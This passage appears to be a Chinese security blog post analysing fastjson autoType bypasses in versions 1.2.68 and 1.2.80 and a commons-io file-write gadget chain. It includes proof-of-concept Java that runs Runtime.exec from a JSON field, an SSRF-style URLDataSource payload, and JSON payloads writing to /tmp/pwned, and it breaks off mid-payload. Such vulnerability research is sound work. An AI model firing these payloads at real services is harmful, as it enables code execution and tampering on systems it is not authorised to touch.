+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmViMTFhYjA4MWVkOWQ4NGMwYjg4NTU2NTc2ODE2NDdfdDM0OUlOWE1wQzJCWm1nZVVENmhJQ1I4a3dRNGVJZXRfVG9rZW46UldzUWI2UXZ5b0hzb0V4ME1OQmNvZFBKbm1oXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>这一段是创建了一个Exception对象，并对poc中的字段值获取字段反序列化器，并将反序列化的结果通过对应字段的setter放进Exception对象中</p>
+<p>最终会调用创建的对象的getter</p>
+<p>但是当有键值包裹的时候异常对象就是Exception,而不是第二个@type后的对象，比如poc</p>
+<p>但是当没有键值包裹的时候创建的异常对象就是第二个@type后的类，比如当poc为这样时</p>
+<p>String poc &#x3D; “{\n” +</p>
+<p>​        “   &quot;@type&quot;: &quot;java.lang.Exception&quot;,    &quot;@type&quot;: &quot;MyException&quot;“ +</p>
+<p>​        “}”;</p>
+<p>Exception对象就是MyException,最终也能成功调用MyException的getter</p>
+<p>所以开头的poc并不能调用InputCoercionException的getter和setter,如果去掉a键值包裹倒是可以</p>
+<h3 id="第二种绕过"><a href="#第二种绕过" class="headerlink" title="第二种绕过"></a>第二种绕过</h3><p>第一种绕过是利用Exception在mapping中，且ThrowableDeserializer.deserialize调用了有expectclass参数的checkautotype.</p>
+<p>第二种绕过是利用AutoCloseable在mapping中并且javabeanDeserializer.deserialize调用了有expectclass参数的checkautotype.</p>
+<p>POC</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.<span class="property">alibaba</span>.<span class="property">fastjson</span>.<span class="property">JSON</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testfj1268</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">String</span> domain;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testfj1268</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">setDomain</span>(<span class="params"><span class="title class_">String</span> domain</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">domain</span> = domain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">String</span> <span class="title function_">getDomain</span>() throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;tr1ple&quot;</span>);</span><br><span class="line">        <span class="title class_">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(domain);</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="title function_">main</span>(<span class="params"><span class="title class_">String</span>[] args</span>) &#123;</span><br><span class="line">       <span class="title class_">String</span> a = <span class="string">&quot; &#123;\n&quot;</span> +</span><br><span class="line">               <span class="string">&quot;            \&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +</span><br><span class="line">               <span class="string">&quot;                \&quot;@type\&quot;: \&quot;testfj1268\&quot;,\n&quot;</span> +</span><br><span class="line">               <span class="string">&quot;                \&quot;domain\&quot;: \&quot;             calc      \&quot;\n&quot;</span> +</span><br><span class="line">               <span class="string">&quot;        &#125;&quot;</span>;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">parseObject</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">close</span>() throws <span class="title class_">Exception</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也能成功弹出计算器，只是从ThrowableDeserializer.deserialize变成了JavaBeanDeserialize.deserialize</p>
+<p>什么时候调用setter?</p>
+<p>不知道为什么我步入不了FastJsonASMDeserializer#deserialze，下图是setter的调用栈</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YTVhODA2OTRmOGUzMzVmNDZjODJhMzAyMGY1Y2M1ZTlfajRKb3M2RFBZUzNWaDJPdFNMTGhueE45QzN6S25zUUNfVG9rZW46RnZPbmJ2bFpTb0xkdkd4Z0lnYWNRam9Rbm5jXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>何时调用getter?</p>
+<p>在成功反序列化对象之后，调用JSON.toJSON(obj)将对象转换成JSONObject(是个Map)</p>
+<p>这个过程中根据类中有多少个getter方法(而不是有多少个属性)创建有多少个元素的Map&lt;String,Object&gt;。</p>
+<p>调用getter将Map填满。之后遍历这个Map,将key和toJSON(value)填入进JSONObject中，因为value也被toJSON()了,所以会调用value所属对象的getter方法。</p>
+<p>因为会调用value的getter,所以又有了新的利用点</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.<span class="property">alibaba</span>.<span class="property">fastjson</span>.<span class="property">JSON</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">activation</span>.<span class="property">DataSource</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">activation</span>.<span class="property">URLDataSource</span>;</span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">swing</span>.*;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">net</span>.<span class="property">URL</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testfj1</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">testfj1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title class_">DataSource</span> dataSource;</span><br><span class="line">    <span class="keyword">public</span> <span class="title class_">DataSource</span> <span class="title function_">getDataSource</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">setDataSource</span>(<span class="params">URL url</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">dataSource</span> = <span class="keyword">new</span> <span class="title class_">URLDataSource</span>(url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">void</span> <span class="title function_">main</span>(<span class="params"><span class="title class_">String</span>[] args</span>) &#123;</span><br><span class="line">        <span class="title class_">String</span> a = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;testfj1\&quot;,\&quot;dataSource\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.net.URL\&quot;,\&quot;val\&quot;:\&quot;http://127.0.0.1:8090/exp\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">parseObject</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为上述代码块有个dataSource属性，对应的setter需要一个URL参数，而URL在白名单中，所以能成功反序列化URL实例。在setter方法中，将URL作为参数赋值给了URLDataSource,而这样的赋值是不经过checkautotype检测的，checkautotype只管反序列化JSON字符串中有@type的部分，而setter部分是管不着的。所以调用setValue方法后DataSource的值就为URLDataSource了，在toJSON阶段URLDataSource还会调用其getter,而URLDataSource中有个getInputStream,调用了url.openStream()，最终会调用url.openConnnection()</p>
+<h2 id="1-2-80"><a href="#1-2-80" class="headerlink" title="1.2.80"></a>1.2.80</h2><p>这个漏洞能将setter参数、公有字段、构造函数参数的类型添加进deserializer中从而使其能绕过checkautotype(其实1.2.68也可以)</p>
+<p>相较于1.2.68,将AutoCloseable添加进了黑名单。所以要用上述的第一种方法利用Throwable进行绕过</p>
+<p>POC</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String poc <span class="operator">=</span> &quot;&#123;\n&quot; <span class="operator">+</span></span><br><span class="line">        &quot;\&quot;a\&quot;:&#123;\n&quot; <span class="operator">+</span></span><br><span class="line">        &quot;   \&quot;<span class="variable">@type</span>\&quot;: \&quot;java.lang.Exception\&quot;,    \&quot;<span class="variable">@type</span>\&quot;: \&quot;MyException\&quot;,\&quot;clazz\&quot;:&#123;&#125;&quot; <span class="operator">+</span></span><br><span class="line">        &quot;&#125;&quot; <span class="operator">+</span></span><br><span class="line">        &quot;\&quot;b\&quot;:&#123;\n&quot; <span class="operator">+</span></span><br><span class="line">        &quot;\&quot;<span class="variable">@type</span>\&quot;:\&quot;Myclass\&quot;&#125;&quot; <span class="operator">+</span></span><br><span class="line">        &quot;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>clazz的编译类型为Myclass</p>
+<p>在checkautotype返回了MyException.class后创建了MyException实例，获取MyException对应的反序列化器ThrowableDeserializer</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=OGQ2YzQ5MWUyYmExYzEyOWRjNTIzOWY3MTg1M2EyOWFfOFFGQ3BiR2VPeGxmZFE5QllHYjJQYmQzY3RlRHVYSHRfVG9rZW46WEpzSWJSSnhLb1IzSnN4bm5uNmNZY1dSbktmXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>之后在上图最下方cast方法中经过一堆判断后将MyClass添加进了deserializer中，这样MyClass也能绕过checkautotype了</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUzMmI1YjNmNjE5MDA4YTMyNGMxNjVmNTQ0MjZhMzJfUjNDSnNsTWxGaE5URFJQb2c5TTA3bXJzMWpDS0tRZFlfVG9rZW46VkJqVGJTQW9Sbzc3czh4em1EUmNXZEFvbmJjXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>但是如果你在JSON字符串中写了的属性没有setter的话就不能成功加载了。</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=MWIwZmVjMGYwNDAwZGE5YWVjYmFhMzNhZTk4MzY5NmNfSUtvTlk0bWJxNFhNNG5PdVNyUUZtTW9ncE05bGJVWVZfVG9rZW46RTlSS2JRSXZxbzlLQ214WTlWMGNhVEZ2bnpmXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>因为没有setter上图标蓝的方法就会返回null，就跳过了给实例clazz赋值的过程。deserialize函数直接返回了上面创建的那个MyException实例。而将MyClass加载进deserializer中是在上图标蓝处下方的cast函数中，所以自然Myclass也就没加载进去。</p>
+<p>上述是将setter参数加载进deserializer的流程，其实构造函数参数和公共字段都是一样的流程，MyException的反序列化器exBeanDeser调用了getFieldDeserializer(key),这个Filed指的是JSON字符串中的字段，不管是setter参数，构造函数参数还是公共字段都属于Field.实例的反序列化器会根据key查找对应的字段反序列化器，找出字段所对应的真正类，接着调用cast进行转换并将真正类加载进deserializer中</p>
+<p>流程：</p>
+<ol>
+<li>反序列化Exception,发现接下来的字段是@type,调用了checkautotype(有expectclass版)</li>
+<li>将MyException加载进mapping中，返回了class后创建MyException实例，获取对应的反序列化器</li>
+<li>通过MyException的反序列化器获取字段的反序列化器，发现实际类型与编译类型不一致后进行cast转换</li>
+<li>将编译类型加载进deserialize中</li>
+<li>将转换好的value利用对应的setter方法放进MyException实例中</li>
+<li>还是在最后toJSON(MyException)时调用的MyException的getter貌似并不会调用value的getter</li>
+</ol>
+<p>参考:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/13489260.html#W6NcatW6">https://www.cnblogs.com/tr1ple/p/13489260.html#W6NcatW6</a></li>
+<li><a target="_blank" rel="noopener" href="https://y4er.com/posts/fastjson-1.2.80/">https://y4er.com/posts/fastjson-1.2.80/</a></li>
+</ol>
+<h2 id="fastjson-in-spring"><a href="#fastjson-in-spring" class="headerlink" title="fastjson-in-spring"></a>fastjson-in-spring</h2><p>payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>XmlStreamReader构造函数</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTIwYWFmMWU2MWNjMDA1OTM4ZDNjYjM5YjFjMzk3OGVfcU9OWE1EZG1sdHRHSUJwVkp3M0tJT0Jtd3BYbTlUb21fVG9rZW46T2w1QmJUREVSbzR0b2R4d1FaZ2Nlc29lblN1XzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>因为fastjson会根据你payload中的字段来决定用哪个构造函数，所以is,httpContentTypem,lenlent,defaultEncoding这四个字段payload中都有</p>
+<p>这个构造函数调用了dohttpStream</p>
+<p>注意看源码，dohttpStream的参数bom是一个BOMInputStream,bom中又包含了一个BufferedInputStream,而BufferdInputStream中又包含了XmlInputStream的构造参数is.</p>
+<p>dohttpStream调用了getBomCharsetName-&gt;getBOM</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YzY5NWRkOGUzYjg3ZjRjY2FjMzNlMTMxNmNjY2MxMmZfR1NBMFRMdHZwdTJCaE91bk9qeWhlRXZnUEJYZ0RidHdfVG9rZW46TTNCOGJNUndWb2ZocVB4bTJmWGN2aEhlbkp4XzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>什么是BOM？</p>
+<p>BOM，全称 <strong>Byte Order Mark</strong>，是一种 <strong>用于标记文本文件编码方式</strong> 的特殊字节序列。</p>
+<p>一种BOM就对应着一种编码方式，通过读取一个流前面的几个字节就可判断是由什么BOM编写的。</p>
+<p>getBOM方法的逻辑如下：</p>
+<p> 获取boms字段第一个字节数组的长度赋值给maxBomSize，创建一个int数组firstBytes长度为maxBomSize.</p>
+<p>循环调用InputStream.read()中读取maxBomSize个字节，将firstBytes与boms中的bom进行比较,如果成功匹配，就返回一个BOM对象</p>
+<p>上图中可以看到getBOM-&gt;in.read()</p>
+<p>而in就是BufferedInputStream</p>
+<p>BufferedInputStream.read()-&gt;is(这个is就是XmlInputStream的参数，即TeeInputStream).read(byte[],int,int)</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YjFlYzA1ZjllZmVkNmQ4ZmRkMzFiNDI5OWFhNWM5OWVfY1RWMjBHNnNtd2w3Yjd4MVZEYU0zR0dEeTlkUUlnTGJfVG9rZW46RkhNNWI5ekJjb2RGY2p4aE1KNGNqWUtCbm9iXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>最终会调用到TeeInputStream的构造参数input(即ReaderInputStream).read(byte[],int,int)-&gt;fillBuffer()-&gt;reader(即CharSequenceReader).read(byte[],int,int)-&gt;read()</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=OTE1NmMzZGNhMmFjYTZjN2RkMTYyNWU4ZDE5MTk1OWVfaXVmdlQ3Q1pmSGE4dGpLMWRETUlpc0g2TjU4SjR0Z0lfVG9rZW46THJRVGJjeldhb29MVGR4S2c2UWNHaHAybnpkXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>读取CharSequence的字节，由poc可知charsequence的值是一个String.</p>
+<p>由TeeInputStream的read(byte[],int,int)方法可知会将Charsequence读取到的值写入进TeeInputStream的构造参数branch中。</p>
+<p>接下来就是写文件部分</p>
+<p>branch是一个WriterOutputStream</p>
+<p>其write(byte[],int,int)-&gt;flushOutput()-&gt;writer(即FileWriterWithEncoding).write(byte[],int,int)-&gt;out(即利用file参数创建的OutputStreamWriter).write(byte[],int,int)</p>
+<p>因为fastjson是先创建字段的实例再创建类的实例，所以当调用XmlStreamReader的构造函数时字段都已经赋值好了，将CharSequence读到的值写入进file中</p>
+<p>但运行程序后会发现文件系统中创建了file,但是里面是空的</p>
+<p>问题出在这个方法</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YmNlNDY4YTcwZjcyYTk0NzFhYTJjOWYyNjEzZTIwMmFfbXlGVnJnSHkzalo0aW8yRThMNUJVUGdjUWdUQWM0Q0RfVG9rZW46T3owUWJEUGRNb0RnYnJ4VjZRRmNRaUJmbjljXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>这是这个方法的调用链</p>
+<p><img src="https://jcnzrjcr90gw.feishu.cn/space/api/box/stream/download/asynccode/?code=YjYyMGFiOTNkZGJiMTcyYzM0ZGZkZWUzYzI1NTVkMDlfRnNDMXUyU04wa0dyZjJ5S2dEekhsamcweG9nMmlFM3pfVG9rZW46WTVlTWJWY2Vub3ppZ294clhwSWNZaXJWbm9kXzE3NzQxNTI4MTc6MTc3NDE1NjQxN19WNA" alt="img"></p>
+<p>因为传入的数组太短了，所以charsequence的值并不会真正的写入文件中。</p>
+<p>那如何使数组增长呢？只是单纯的增长charsequence的值并不能成功写入，因为XmlStreamReader#dohttpstream中创建的BufferedInputStream的长度给定了是4096，但是需要超过8192才能成功写入。</p>
+<p>要利用fastjson的$ref循环引用机制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,</span><br><span class="line">  <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span>,</span><br><span class="line">  <span class="string">&quot;reader&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span>,</span><br><span class="line">  <span class="string">&quot;charSequence&quot;</span>:&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aaaaaa...(长度要大于8192，实际写入前8192个字符)&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">  <span class="string">&quot;bufferSize&quot;</span>:1024</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span>,</span><br><span class="line">  <span class="string">&quot;writer&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span>,</span><br><span class="line">  <span class="string">&quot;file&quot;</span>:<span class="string">&quot;/tmp/pwned&quot;</span>,</span><br><span class="line">  <span class="string">&quot;encoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">  <span class="string">&quot;append&quot;</span>: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;charsetName&quot;</span>:<span class="string">&quot;UTF-8&quot;</span>,</span><br><span class="line">  <span class="string">&quot;bufferSize&quot;</span>: 1024,</span><br><span class="line">  <span class="string">&quot;writeImmediately&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;trigger&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span>,</span><br><span class="line">  <span class="string">&quot;is&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span>,</span><br><span class="line">  <span class="string">&quot;input&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;<span class="variable">$ref</span>&quot;</span>:<span class="string">&quot;$.input&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;branch&quot;</span>:&#123;</span><br><span class="line">  <span class="string">&quot;<span class="variable">$ref</span>&quot;</span>:<span class="string">&quot;$.branch&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;closeBranch&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;httpContentType&quot;</span>:<span class="string">&quot;text/xml&quot;</span>,</span><br><span class="line">  <span class="string">&quot;lenient&quot;</span>:<span class="literal">false</span>,</span><br><span class="line">  <span class="string">&quot;defaultEncoding&quot;</span>:<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;trigger2&quot;</span>:&#123;</span><br><span class="line">  <span 